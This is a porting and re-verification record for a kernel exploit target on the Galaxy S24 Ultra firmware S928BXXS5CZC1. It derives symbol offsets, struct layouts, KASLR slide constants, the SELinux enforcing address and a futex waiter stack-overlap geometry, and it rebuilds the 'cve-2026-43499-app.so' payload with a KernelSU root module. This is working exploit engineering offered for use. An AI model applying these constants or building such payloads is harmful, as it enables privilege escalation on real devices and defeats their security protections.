# SM-S928B / S928BXXS5CZC1 (Galaxy S24 Ultra, e3q, Android 16)

Porting and re-verification record for the `e3q-S928BXXS5CZC1` target. Every
firmware-dependent constant was re-derived from the exact `S928BXXS5CZC1_EUX`
firmware on 2026-08-08, following `PORTING.md`. Three slide constants in the
originally committed `target.h` did not survive re-derivation and were
corrected; all other values were confirmed.

## Firmware identity

Downloaded with samloader from FUS (model `SM-S928B`, region `EUX`), completed
manually after a transport stall; every zip entry's CRC32 verified intact.

```text
file:    S928BXXS5CZC1_EUX.zip
size:    17928480688
entries: BL/AP/CP/HOME_CSC/CSC tar.md5, AP is meta_OS16
```

Build identity from `meta-data/fota.zip` inside the AP tar:

```text
ro.bootimage.build.fingerprint=samsung/e3qxxx/e3q:14/UP1A.231005.007/S928BXXS5CZC1:user/release-keys
ro.system.build.fingerprint=samsung/e3qxxx/qssi_64:16/BP2A.250605.031.A3/S928BXXS5CZC1:user/release-keys
ro.build.display.id=BP2A.250605.031.A3.S928BXXS5CZC1
```

`BUILD_FINGERPRINT` keeps the boot-image identity (`14/UP1A.231005.007`),
matching `ro.bootimage.build.fingerprint` of the partition that actually ships
the kernel. The live device additionally reports
`ro.build.fingerprint=...:16/BP4A.251205.006/...`; that is the device-level
property, not the boot image's. Live device cross-check:

```text
uname -r: 6.1.128-android14-11-31999054-abS928BXXS5CZC1
ro.build.fingerprint: samsung/e3qxxx/e3q:16/BP4A.251205.006/S928BXXS5CZC1:user/release-keys
```

## Kernel recovery

`boot.img.lz4` (21569216 bytes) decompressed to `boot.img` (100663296 bytes):

```text
boot.img SHA-256: 05E27BE9CF05D1DA8237C80768FDB2D0E778BC23CE547E62EF781C71F2C5140A
kernel   SHA-256: D4FEB6B808D2E45FC7E9F4E5C4529B5FDE017F644F261BA21F98412DF3712442
kernel   size:    37022208
ARM64 Image: magic ARMd, text_offset 0x0, image_size 0x25c0000, flags 0xa
```

`vmlinux-to-elf` recovered 104498 kallsyms at base `0xffffffc008000000`
(`KIMAGE_TEXT_BASE` confirmed). Exactly one valid raw BTF blob was found and
extracted: `[0x1769e0c, 0x1d00646)` (5859386 bytes), dumped with `bpftool` in
raw and C formats.

## Symbol offsets (all confirmed against `vmlinux.nm`)

`call_usermodehelper_exec_work` 0x000d388c, `noop_llseek` 0x0039ed18,
`generic_file_splice_read` 0x003ecac8, `configfs_read_iter` 0x0046e4c0,
`configfs_bin_write_iter` 0x0046e9f0, `ashmem_ioctl` 0x00cda318,
`compat_ashmem_ioctl` 0x00cdac50, `ashmem_mmap` 0x00cdaca8,
`ashmem_open` 0x00cdaed4, `ashmem_release` 0x00cdaf5c,
`ashmem_show_fdinfo` 0x00cdb07c, `anon_pipe_buf_ops` 0x011b6bd0,
`ashmem_fops` 0x0135e7a0, `kmalloc_caches` 0x016d09d8,
`system_unbound_wq` 0x0215ae60, `init_task` 0x0216f8c0,
`root_task_group` 0x0235cd80 — all match `target.h` exactly.

`ASHMEM_MISC_FOPS_OFF 0x022cfc30` = `ashmem_miscs` (0x022cfc20) +
`offsetof(struct miscdevice, fops)` (0x10, BTF-confirmed). ✓

`SELINUX_ENFORCING_OFF 0x02431460` = `selinux_state` (0x02431460) + `enforcing`
at member offset 0x0 (BTF-confirmed). ✓

## Struct layouts (BTF-verified)

`file_operations` size 0x110 with `unlocked_ioctl` 0x50, `compat_ioctl` 0x58,
`mmap` 0x60, `open` 0x70, `release` 0x80, `splice_read` 0xc8,
`show_fdinfo` 0xe0. `task_struct`: `usage` 0x40, `prio` 0x84,
`normal_prio` 0x8c, `sched_task_group` 0x348, `pi_lock` 0x924,
`pi_waiters` 0x938, `pi_top_task` 0x948, `pi_blocked_on` 0x950.
`rt_mutex_waiter` size 0x58, compact: `tree_entry` 0x00, `pi_tree_entry` 0x18,
`task` 0x30, `lock` 0x38, `wake_state` 0x40, `prio` 0x44, `deadline` 0x48,
`ww_ctx` 0x50 (`COMPACT_RT_MUTEX_WAITER 1` correct). `configfs_buffer` size
0x80: `page` 0x10, `needs_read_fill` 0x50, `bin_buffer` 0x58,
`bin_buffer_size` 0x60, `cb_max_size` 0x64. `workqueue_struct.dfl_pwq` 0xb0;
`pool_workqueue`: `pool` 0x00, `wq` 0x08, `work_color` 0x10, `refcnt` 0x18,
`nr_active` 0x5c, `max_active` 0x60; `worker_pool`: `worklist` 0x28,
`nr_idle` 0x3c; `work_struct`: `data` 0x00, `entry` 0x08, `func` 0x18.
`struct page` size 0x40: `compound_head` 0x08 (compound variant of the first
union), `page_type` 0x30; SLUB tracks the cache through `struct slab` with
`slab_cache` at 0x18. `skb_shared_info` size 0x158 (344) — same
`SKB_MAX_HEAD(0)` = 0xe80 geometry as DZF2; `SKB_DATA_DELTA -0x1000` retained
(page-aligned first order-3 fragment, as documented for the sibling).

## Slide constants: three corrected, rest confirmed

The oracle's `nfnetlink_log` evidence, verified directly in the raw image:

```text
"nfnetlink_log" string:  exactly one occurrence, image offset 0x0161b7b5
loggers[] registry base: 0x02162968 (symbol)
nfulnl_logger object:    0x02162a20 (symbol) = loggers + 0xb8
object contents:         name -> 0xffffffc00961b7b5 (the string above),
                         type = 1, log -> 0xffffffc008eacd44
```

Per the DZF2 semantics, `SLIDE_NFULNL_LOGGER_NAME_IMAGE` must be the string
(so `leaked - offset` yields `_stext`) and `SLIDE_NFULNL_LOGGER_OBJECT_IMAGE`
must be the object (the rb parent write target). The originally committed
header pointed NAME at the object (0x02162a20) and OBJECT at the loggers
registry base (0x02162968, 0xb8 below the object). Corrected to:

```c
#define SLIDE_NFULNL_LOGGER_OFF 0x0161b7b5ULL   /* name string */
#define SLIDE_LOGGERS_0_1_OFF   0x02162a20ULL   /* nfulnl_logger object */
```

The `boot_id` sysctl evidence:

```text
sysctl_bootid (data storage): 0x024d35a8 (symbol) ✓
unique qword == &sysctl_bootid found at image offset 0x0228ab38
entry context: [0x228ab30] = 0xffffffc009606835 -> "boot_id" (procname),
               [0x228ab38] = 0xffffffc00a4d35a8 (data -> sysctl_bootid)
```

The committed value 0x0228aa30 belongs to a different `ctl_table` entry (its
qword is a .rodata string pointer, not `&sysctl_bootid`). Corrected to:

```c
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0228ab38ULL
```

`SLIDE_INIT_TASK_OFF` / `SLIDE_ROOT_TASK_GROUP_OFF` / `SLIDE_SYSCTL_BOOTID_OFF`
confirmed from symbols (see above). `SLIDE_RB_PARENT_TYPE_RESTORE 1` retained
(exploit logic constant).

## Tracepoint channel

`__start_ftrace_events` 0x0211f108, `__event_sched_blocked_reason` 0x0211f3b8:
`(0x211f3b8 - 0x211f108) / 8 = 86` → `TRACE_SYSTEM_MESSAGE + 86` = **106**
(`SLIDE_TRACEFS_EVENT_ID 106` ✓, also observed live on the device at
`/sys/kernel/tracing/events/sched/sched_blocked_reason/id`).

`worker_thread` at 0x000dafa8; its blocking `bl schedule` sits at
0xffffffc0080db044, return address 0xffffffc0080db048 →
`SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db048` ✓.

## pselect word shift

Frame geometry re-derived from the CZC1 disassembly:

```text
__arm64_sys_futex      sub sp, #0x70
do_futex               sub sp, #0x60
futex_wait_requeue_pi  sub sp, #0x1b0   ; rt_mutex_waiter local at sp + 0x98
  (x2 = sp+0x98 -> rt_mutex_wait_proxy_lock, x1 = sp+0x98 -> cleanup)
=> stale waiter at E - 0x1e8

__arm64_sys_pselect6   sub sp, #0x90    ; calls core_sys_select directly
core_sys_select        sub sp, #0x1c0   ; stack_fds (SELECT_STACK_ALLOC=256)
                                         at sp + 0x50, sets strided by size
=> stack_fds at E - 0x200
```

Waiter qword 0 therefore lands on global fd-set word (0x200 - 0x1e8) / 8 = 3:

```c
#define SLIDE_PSELECT_WORD_SHIFT 3
```

identical to the hardware-confirmed DZF2 geometry. The waiter the payload
reclaims is `futex_wait_requeue_pi`'s `rt_mutex_waiter` (the
`FUTEX_WAIT_REQUEUE_PI` route in `main.c` / `slide_app.c`), not the
`futex_lock_pi` local — the two frames differ by one qword on this kernel, so
the distinction decides between shift 3 and 2.

## Physical load address (Qualcomm ABL)

`BL_...tar.md5` → `abl.elf.lz4` (756403 bytes, SHA-256
b2d4a2ab6f9b7673627bfab23ed150ab49cc56698bc26d6d179904429eaf212e) → `abl.elf`
(2441528 bytes). Its single LOAD segment contains a UEFI FV at +0x28 whose
GUID-defined section is LZMA (`EE4E5898-3914-4259-9D6E-DC7BD79403CF`); the
decompressed inner FV (3359176 bytes) holds the LinuxLoader FFS
(`f536d559-459f-48fa-8bbc-43b554ecae8d`) with a PE32 section (0x190004 bytes).

In that PE (AArch64, image base 0):

1. Memory base is enumerated dynamically: RVA 0x12a38-0x12a54 walks the
   descriptor list with `cmp`/`csel lo` keeping the minimum, stores it, then
   prints `"Memory Base Address: 0x%x"` (string at RVA 0xcf9fa).
2. Constant table at RVA 0xd42f0: `0x00080000` (ARM64 load offset),
   0xd42f4: `0x05600000` (ARM64 region size), 0xd42f8: `0x03c00000`
   (ARM32 region), 0xd42fc: `0x00008000` (ARM32 offset).
3. RVA 0x176b8-0x17700 selects by arch flag: `csel` picks slot 0xd42f0 /
   0xd42f4 for ARM64, then `ldr w8, [0x80000]`, `ldr w9, [0x5600000]`,
   `orr x8, x10, x8` (load base = mem_base | 0x80000), `add x10, x10, x9`,
   `stp x8, x10, [sp, #0x88]`; an alternate path builds the same constant as
   `add x9, x8, #0x80, lsl #12` = +0x80000 (RVA 0x1774c).
4. `[sp, #0x88]` is later printed as `"Kernel Load Address: 0x%x"`
   (RVA 0x17d70-0x17d7c, string at RVA 0xb85d6).

The vendor_boot DTB (single FDT at vendor_boot+0xec2000) reserves
`gunyah_hyp_region@80000000`, anchoring the lowest RAM descriptor at
`0x80000000`. Therefore kernel load = `0x80000000 | 0x80000` = `0x80080000`,
entry = load + text_offset(0):

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
```

## P0 fingerprint

`tools/generate_p0_fingerprint.pl` against the raw CZC1 kernel at probe offset
`0x1f0000` (`P0_ORACLE_PROBE_OFFSET`): all 32 rows verified with 256 source
qwords read back, and the result is **byte-identical** to the checked-in
`src/targets/e3q-S928BXXS5CZC1/p0_fingerprint.h` (SHA-256 of the file:
403ad33fbf5b45246a33adfae7e4b7cf9d07842f432e96bf0145bad6eab3e1d8).

## Build

Rebuilt with Android NDK r29 (`aarch64-linux-android35-clang`):

```sh
make TARGET=e3q-S928BXXS5CZC1 ANDROID_NDK_HOME=/tmp/android-ndk-r29 all release
```

The rebuilt release `.so` differs from the previously published artifact only
in the materialized slide constants (movn/movk pairs), e.g. the name-leak
constant `0x169b7b5` (string + 0x80000) replacing `0x21e2a20` (object +
0x80000), and the boot-id slot `0x230ab38` replacing `0x230aa30` — the runtime
constant base is image offset + 0x80000 (direct-map placement above
`P0_PHYS_OFFSET`). The fixed artifact:

```text
artifacts/e3q-S928BXXS5CZC1/cve-2026-43499-app.so
size:    104128 (enforced gate)
SHA-256: 8a2c68c1363006ad7173e7acf24397fed256fc764a388ebb2e39cadff96e0767
```

## KernelSU module

`kernelsu/android14-6.1_kernelsu-e3q-S928BXXS5CZC1-kdp.ko` audited against the
recovered CZC1 `vmlinux.elf` plus the extracted target `Module.symvers`
(8078 CRCs):

```text
vermagic: 6.1.128-android14-11-31999054-abS928BXXS5CZC1 SMP preempt mod_unload modversions aarch64
undefined symbols: 209
missing from target symbol table: 0
module version entries: 0 (manual-relocation build, .symtab/.strtab kept)
symbols resolved from kallsyms rather than target exports: 75
target CRC mismatches: 0
```

matches the documented E3Q audit profile (209 imports, 0 missing).

```text
android14-6.1_kernelsu-e3q-S928BXXS5CZC1-kdp.ko
size:    400200
SHA-256: 249194b189b333992e9d544d07080d342fe4d6be2f96af55d579be27183c4db7

ksud-e3q-S928BXXS5CZC1-kdp
size:    4782744
SHA-256: aceb0c36fe1c7a65978a2f4d2d9d45f82876bc7cec4d7b686d3dd4b623643df3
```

## Support feed

`support/targets-v3.json` already carries `e3q-S928BXXS5CZC1`
(SM-S928B, kernelVersions ["6.1.128"]) with exploit size 104128 and kernelsu
size 4782744 — both unchanged by the corrected rebuild. JSON re-validated.

## Provenance and cleanup

Retained after cleanup, per policy:

```text
analysis-s928b-czc1/firmware/AP/kernel
  source firmware: S928BXXS5CZC1_EUX.zip (SM-S928B, EUX, meta_OS16)
  AP tar entry: AP_S928BXXS5CZC1_S928BXXS5CZC1_MQB107205438_REV00_user_low_ship_MULTI_CERT_meta_OS16.tar.md5
  member: boot.img.lz4 (21569216) -> boot.img (100663296)
  kernel size:    37022208
  kernel SHA-256: D4FEB6B808D2E45FC7E9F4E5C4529B5FDE017F644F261BA21F98412DF3712442
  boot.img SHA-256: 05E27BE9CF05D1DA8237C80768FDB2D0E778BC23CE547E62EF781C71F2C5140A
```

Hardware execution of the rebuilt payload on the SM-S928B remains a separate
validation step (the DZF2 sibling profile was validated on an SM-S928U1).
